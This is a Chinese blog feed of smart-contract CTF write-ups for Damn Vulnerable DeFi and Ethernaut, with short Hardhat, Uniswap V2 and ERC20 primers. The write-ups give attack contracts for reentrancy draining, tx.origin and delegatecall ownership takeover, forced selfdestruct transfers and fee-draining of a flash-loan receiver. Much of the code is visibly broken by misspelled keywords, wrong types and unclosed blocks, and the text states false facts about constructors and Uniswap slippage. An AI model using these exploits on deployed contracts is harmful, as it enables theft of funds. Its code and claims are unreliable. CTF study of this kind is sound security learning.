must return magic value, otherwise assume it failed</span><br><span class="line">       uint256 fee = flashFee(_token, amount);</span><br><span class="line">       if (</span><br><span class="line">           receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)</span><br><span class="line">               != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">       ) &#123;</span><br><span class="line">           revert CallbackFailed();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">       ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">       ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>revert的关键：  <code>convertToShares(totalSupply) != balanceBefore</code>，首先来看这个totalSupply,很熟悉，在ERC20中见过，又整体看这个合约，其实是继承了ERC20，totalSupply在ERC4626中定义了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC4626部分合约</span><br><span class="line"></span><br><span class="line">function convertToShares(uint assets) public view virtual returns (uint256)&#123;</span><br><span class="line">    uint256 supply = totalSupply;</span><br><span class="line">    return supply = 0 ? assets : assets.mulDivDown(supply,talalAssets());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>totalAssets()：计算的是当前金库中的资产代币数目</li><li>convertToShares(totalSupply)：totalSupply 是总的 share 代币数目（只有 deposit 或 mint 时才会产生），convertToShares 就是计算：assets * totalSupply &#x2F;totalAssets ()</li></ul><p>从中我们可以看到 supply&#x3D;assets*supply&#x2F;talalAssets(),如果我们让talalAssets()总数增加，而assets不变，就能满足convertToShares(totalSupply) !&#x3D; balanceBefore，所以就只要不通过 depost 或 mint 方法向 UnstoppableVault 中转入 token 即可</p><p>方法：在<strong>Unstoppable.t.sol</strong>测试合约中写我们的攻击合约,记得找对位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * CODE YOUR SOLUTION HERE</span><br><span class="line"> */</span><br><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    vm.startPrank(player);</span><br><span class="line">    taken.transfer(address(vault),1) </span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>要求是，掏空一个用户已经部署的合约上的ETH</p><p>分析，部署合约，pool的闪电贷手续费为1eth,receiver已经有了10eth,要使 receiver 中的余额为 0，pool 中的余额为 1000+10eth，就是因此只需通过 receiver 向 pool 执行十次闪电贷即可把 10eth 全部通过手续费的方式转给 pool</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    constructor(address payable _pool, address payable _receiver)&#123;</span><br><span class="line">        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);</span><br><span class="line">        for(uint256 i=0; i&lt;10; i++)&#123;</span><br><span class="line">            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>要求是，获取这个池中的全部DIV</p><p>分析：</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hardhat</title>
      <link href="/2024/08/06/hardhat/"/>
      <url>/2024/08/06/hardhat/</url>
      
        <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>就是以太坊开发环境，如同remix,现在介绍一下安装<strong>hardhat</strong>的步骤</p><ul><li>打开终端，win+r,输入cmd</li><li>检查node js,安装没有，<code>node -v</code> (没有安装去官网下载)</li><li>建一个文件夹，在终端输入<code>mkdir hardhat-tutorial</code>，然后进入文件夹，<code>cd hardhat-tutorial</code></li><li>进行初始化，<code>npm init</code>，接下来一直按enter,直到出现<code>Is this OK? (yes)</code>,回答yes即可</li><li>安装<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,需要等待几秒</li><li>再安装一个插件 npm install –save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="编写合同"><a href="#编写合同" class="headerlink" title="编写合同"></a>编写合同</h2><p>安装完成后，因为使用VScode,所以我们要安装一个VScode 安全帽，它可以帮组我们更好的使用solidity语言，然后在VScode创建一个新目录，写一个简单的.sol合约，在终端中运行该合约，<code>npx hardhat compile,</code>成功后就会看到<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="测试合约"><a href="#测试合约" class="headerlink" title="测试合约"></a>测试合约</h2><p><code>npx hardhat test</code>,如果你想看到solidity的日志消息，合约变量，必须导入<code>hardhat/console.sol</code>合约代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再添加一些对该函数console.log的调用transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结，hardhat就是能轻松部署我们的合约、运行测试和调试 Solidity 代码，无需处理实时环境，更多知识请参考<a href="https://hardhat.org/">hardhat</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap V2</title>
      <link href="/2024/08/06/uniswap-V2/"/>
      <url>/2024/08/06/uniswap-V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>是一种流行的去中心化交易所 (DEX)协议，允许用户将任何 ERC20 代币交换为另一种代币，提供流动性以赚取费用，并访问以太坊区块链上的价格预言机。 而Uniswap V2具有更强大的功能，如下：</p><ul><li>它允许任何的ERC20代币与其他的ERC20代币配对，无需ETH作为中介，这使得流动性池更加多样化和高效，并为交易者提供更好的价格。 就是一种代币可与其他的代币转化，方便很多</li><li>Uniswap V2 实施了一种新颖的机制，可实现高度去中心化且抗操纵的链上价格供给。 这是通过在每个区块开始时测量两种资产的相对价格并随着时间的推移积累历史数据来实现的。 这允许外部智能合约查询任何时间间隔内任何货币对的时间加权平均价格（TWAP），同时将天然气成本和预言机风险降至最低。</li><li>Uniswap V2 支持一种称为闪电互换的新型交易，用户可以从池中接收任意数量的任何资产，并在链上的其他地方使用它，只要他们在交易结束时偿还该金额并支付费用即可。 交易。 这为套利、保证金交易、抵押品互换等开辟了新的可能性。</li></ul><p>同时它也有很多好处：</p><ul><li>低费用：Uniswap V2 对每笔交易收取 0.3% 的固定费用，该费用由所有流动性提供者按其在池中的权益比例分配。 该费用低于大多数中心化交易所和其他 DEX 协议，这使得 Uniswap V2 成为中小额交易的有吸引力的选择。</li><li>高流动性：Uniswap V2 利用以太坊及其庞大的 ERC20 代币生态系统的网络效应，为任何代币对提供高流动性。 任何人都可以通过提供一定数量的两种代币来创建新的货币对或加入现有的货币对，从而增加池的深度和可用性。 此外，Uniswap V2 采用自动做市商（AMM）模型，根据供需情况调整价格，确保任何交易规模始终有足够的流动性。</li><li>无许可访问：Uniswap V2 是<strong>完全去中心化和非托管的</strong>，这意味着任何人都可以使用它，而无需注册帐户、验证身份或信任第三方使用其资金。 用户可以完全控制自己的资产，可以随时进行交易或提供流动性，而无需担心停机、审查或黑客攻击。</li><li>透明定价：Uniswap V2 采用简单透明的定价机制，由恒定乘积公式和矿池当前准备金余额决定。 用户可以轻松计算他们将收到或支付任何交易的确切代币数量，没有任何隐藏费用或滑点。 用户还可以根据池的历史数据访问任何货币对的可靠且无需信任的价格预言机。</li></ul><p>要使用Uniswap V2可在<a href="https://uniswap.org/">官网</a>上访问,可以自己创建一个Uniswap钱包，一定要记住<strong>私钥</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/08/05/ERC20/"/>
      <url>/2024/08/05/ERC20/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>是以太坊上的代币标准，它实现了代币转账的基本逻辑：</p><ul><li>账户余额(balanceOf())</li><li>转账(transfer())</li><li>授权转账(transferFrom())</li><li>授权(approve())</li><li>代币总供给(totalSupply())</li><li>授权转账额度(allowance())</li><li>代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())</li></ul><p>除了ERC20,还有它的接口合约IERC20，就是为了统一规范，以便好使用，接下来就介绍一下IERC20合约的功能</p><h2 id="俩个事件"><a href="#俩个事件" class="headerlink" title="俩个事件"></a>俩个事件</h2><ul><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>from</code>) 转账到另一账户 (<code>to</code>)时.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>owner</code>) 授权给另一账户 (<code>spender</code>）时.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="六个函数"><a href="#六个函数" class="headerlink" title="六个函数"></a>六个函数</h2><ul><li><code>totalSupply()</code>返回代币总供给<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>返回账户<code>account</code>所持有的代币数.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>转账 <code>amount</code> 单位代币，从调用者账户到另一账户 <code>to</code>,如果成功，返回 <code>true</code>,释放 {Transfer} 事件.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>返回<code>owner</code>账户授权给<code>spender</code>账户的额度，默认为0,当{approve} 或 {transferFrom} 被调用时，<code>allowance</code>会改变<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>调用者账户给<code>spender</code>账户授权 <code>amount</code>数量代币,如果成功，返回 <code>true</code>,释放 {Approval} 事件<br><code>function approve(address spender, uint256 amount) external returns (bool);</code></li><li><code>transferFrom()</code>通过授权机制，从<code>from</code>账户向<code>to</code>账户转账<code>amount</code>数量代币。转账的部分会从调用者的<code>allowance</code>中扣除。 如果成功，返回 <code>true</code>. 释放 {Transfer} 事件. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>以上须记住，以便好用</li></ul><p>说白了，它就是以太坊发行代币的一个标准，学会了如何实现ERC20，对入门区块链是很有帮助的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut靶场题解</title>
      <link href="/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上不能部署这个合约，因为部署后，合约初始化，owner就是我们自己了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>直接使用合约地址<strong>At Adress</strong><br>2,调用contribute函数，转账1wei；<br>2,调用receive函数，转账1wei,就完成了,注意记得将钱收回来</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>分析：<br>注意这个的solidity的版本是0.6，没有影响关系，只是构造函数的写法不一样，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：直接部署不行，因为里面有其他的import，所以我们就外部调用这个合约，使用接口,另创建一个合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //观察所有者的地址是否为我们</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>要求是，连续猜对10次猜对硬币的结果</p><p>分析：就是要想办法调用flip()函数10次，让猜测的结果与side一致</p><p>方法：直接上攻击合约,在目标合约内,部署攻击合约，就是一样的调用目标合约的flip函数之后，得到的guess在进入一样的目标合约之中，这样我们的猜测值guess就与side一样了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//保证攻击合约中的guess与初始合约的side一样</span><br><span class="line">    &#125;</span><br><span class="line">  // 复制初始合约的flip()函数</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>要求是，获得该合约的所有权</p><p>分析：代码还是挺短的，主要就是弄懂<strong>tx.origin</strong>是什么意思，<strong>tx.origin</strong>是发起交易的账户，<strong>msg.sender</strong>是当前直接调用这个合约的即时账户，只要这俩者不一样就成功了<br>详细解释：</p><ul><li>A调用B合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;A</li></ul></li><li>A调用B合约，B合约调用C合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;B</li></ul></li></ul><p>方法：直接调用Telephone合约，不能满足条件，所以我们要写一个攻击合约来调用Telephone合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_target接受Telephone的地址，我们部署Hack合约，msg.sender就是我们的地址</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>要求是，我们有20个代币，需要让代币余额增加到20以上</p><p>分析：还是看solidity版本，0.6版本没有内置Safemath,所以就可以执行溢出或者下溢的操作  </p><blockquote><p>Safemath:在Solidity 中，SafeMath是一个常用的库，用于防止整数溢出和下溢的安全数学运算工具。由于Solidity的整数类型（如 uint 和int ）是有限的，当进行加法、减法、乘法或除法运算时，如果操作结果超出了类型范围，就会导致溢出或下溢<br>如，0-1会导致下溢，就会生成最大的无符号整数，并且大于0</p></blockquote><p>方法：调用攻击合约中，再调用transfer函数，给msg.sender转账1个代币，由于攻击合约没有代币，就会发生下溢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>要求是，获得这个合约的所有权</p><p>分析：理解<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,就是调用pwm函数，通过触发fallback函数，然后进行委托用</p><p>方法：部署Delegate合约，但是不调用，我们是在delegation合约上调用pwn函数</p><hr><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>要求是，使这个合约的余额大于零</p><p>分析：代码还是很简单，就是一个空合约，什么函数也没有，就考虑到自毁合约的功能  </p><blockquote><p>自毁合约：自毁合约是一种智能合约，通常基于区块链技术，其设计初衷是在特定条件下自动执行某些预定的操作，最终将合约自身的功能或者存储的资产销毁。这种合约的设计可以确保在特定情况发生时，例如某个时间点到达、某个条件达成或者特定的事件发生，合约内部的资产或者代码可以被永久删除或者无法访问。</p></blockquote><p>方法：使用通过selfdestructh功能删除一个合约，合约内所有的余额将被强制发送到另一个合约，就是写一个攻击合约自毁</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约时记得发送1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>要求是，解锁保险箱</p><p>分析：password是个私有变量，不能直接获取，但是它也是个状态变量，可以访问的，通过回到ethernaut网站，在控制台获得密码即可</p><p>方法：在控制台输入 <code>await web3.eth.getStorageAt(contract.address,1)</code>, 获得密码</p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>要求是，破坏游戏规则</p><p>分析：通过合约来看就是阻碍别人调用receive函数,拒接别人的转账,</p><p>方法：写一个攻击合约,不要有fallback,receive函数，防止新玩家转账，成为新国王</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行攻击合约时，首先检查当前的奖金值，然后部署攻击合约时，发送该奖金值</p><hr><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>要求是：窃取合约中的所有资金</p><p>分析：这是一个典型的重入攻击  </p><blockquote><p>重入攻击：重入攻击的典型示例是以太坊的智能合约中发生的情况。以太坊的智能合约是按照以太币（ETH）的传统交易方式执行的，合约可以调用其他合约或发送ETH到外部账户。如果一个合约在调用外部合约时先转移ETH给另一个合约，并且在接收ETH后再执行其他逻辑，那么这个外部合约可以在接收ETH后调用原合约，重新执行发送ETH的逻辑，导致重复的ETH转移，从而造成资金损失。<br>通过不断调用withdraw函数,窃取资金</p></blockquote><p>方法: 写一个攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约,调用attack函数发送1ether,即可</p><hr><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>要求是,到达建筑物的顶楼</p><p>分析:第一次的building.isLastFloor(_floor)要为false,满足if的条件,第二次的building.isLastFloor(_floor)要为ture,使电梯到楼顶</p><p>方法: 就是在攻击合约中写isLastFloor函数,达到要求,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>要求是,解锁该合约</p><p>分析:就是将locked初始值ture,改为false,调用unlock函数</p><p>方法: 首先要知道每个私有状态可变的储存slot,如图:<br>![这是图片](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg slot)<br>再使用Web库来获取这个数据,然后截取为16字节,即为密钥,再调用unlock函数,将其作为参数传递即可</p><hr><h2 id="Naugth-Coin"><a href="#Naugth-Coin" class="headerlink" title="Naugth Coin"></a>Naugth Coin</h2><p>要求是,将代币余额变为零</p><p>分析:难点有个时间锁,在转移代币时,必须等待10年,所以就思考其他的方法,然后就是熟悉ERC20合约,目标合约importl了ERC20,后面的攻击合约也要使用,建议先熟悉ERC20合约再来解题,我这就直接上攻击合约</p><p>方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solodity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface INaughtCoin &#123;</span><br><span class="line"> function player() external view returns(address);</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"> function balanceof(address account) external view returns (uint256);function approve(address spender, uint256 amount) external returns(bool);</span><br><span class="line"> function transferFrom(address sender,address recipient, uint256 amount)extlernal;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  //deploy</span><br><span class="line">  //coin.approve(hack,amount)</span><br><span class="line">  //pwn</span><br><span class="line">  function pwn(IERC20 coin) external &#123;</span><br><span class="line">    address player = INaughtCoin(address(coin)).player;</span><br><span class="line">    uint bal = coin.balanceOf(player);</span><br><span class="line">    coin.transferFrom(player,address(this),bal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>要求是,获得该合约的所有权</p><p>分析:委托调用,注意看函数签名,<code>bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;))</code>,当我们调用setFirstTime函数时,委托调用会执行setTime函数,此时timeZone1Library的地址将会更新,如果我们再次调用setFirstTime函数,又更新地址,这样就能成为owner</p><p>方法:还是写一个攻击合约,进行调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint256 storedTime;</span><br><span class="line"></span><br><span class="line">  function attack(Preservation target) external &#123;</span><br><span class="line">    target.setFistTime(uint256(uint160(address this)));</span><br><span class="line">    target.setFistTime(uint256(uint160(msg.sender)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _owner) external &#123;</span><br><span class="line">    owner = address(uint160(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>要求是,恢复丢失的0.001以太币</p><p>分析:这是一个工厂合约,由于不知道代币的地址,无法找到丢失的以太币,所以我们的任务是找到这个代币合约的地址,然后进行自毁合约,有俩种方法找到代币合约的地址,一是通过区块链浏览器Etherscan,查询调用generate Token交易,找到代币合约地址,二是通过计算,在Ethereum Stack Exchange上可以查询计算方式</p><p>方法:采用计算地址的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dev&#123;</span><br><span class="line">  function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">    address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01))))));</span><br><span class="line">    return addr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="MagicNunmber"><a href="#MagicNunmber" class="headerlink" title="MagicNunmber"></a>MagicNunmber</h2><p>要求是,调用whatIsTheMeaningOfLife()函数,并且返回数字42,但是攻击合约不能超过10个合约</p><p>分析:如果直接调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">   function whatIsTheMeaningOfLife() external pure returns (uint)&#123;</span><br><span class="line">    return 42;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约将超过10个合约码,不符合要求,这时就使用汇编编写一个智能合约,然后手动部署代码(本人还在学习汇编语言)</p><hr><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>要求是,在所有者在调用withdraw函数时拒绝其提取资金</p><p>分析:这题大概思路很好懂,就是如何去实现拒绝转账这步要思考一下,又是要用到汇编语言,等我学习后再来补题解</p><hr><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>要求是，以低于要价的价格从商店购买物品</p><p>分析：就是使状态变量isSold等于true，而且还要使价格低于100，目标合约已经给了一个接口，就是就是在调用这个接口的时候满足要求，第一次调用的时候，要使价格高于100，满足if的条件，第二次调用的时候price就设置低于100的价格即可</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  Shop private immutable target;</span><br><span class="line"></span><br><span class="line">   constructor (address _target)&#123;</span><br><span class="line">    target = Shop(_target);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function pwn() external &#123;</span><br><span class="line">    target.buy();</span><br><span class="line">   &#125;</span><br><span class="line">   function price() external view returns (uint256)&#123;</span><br><span class="line">    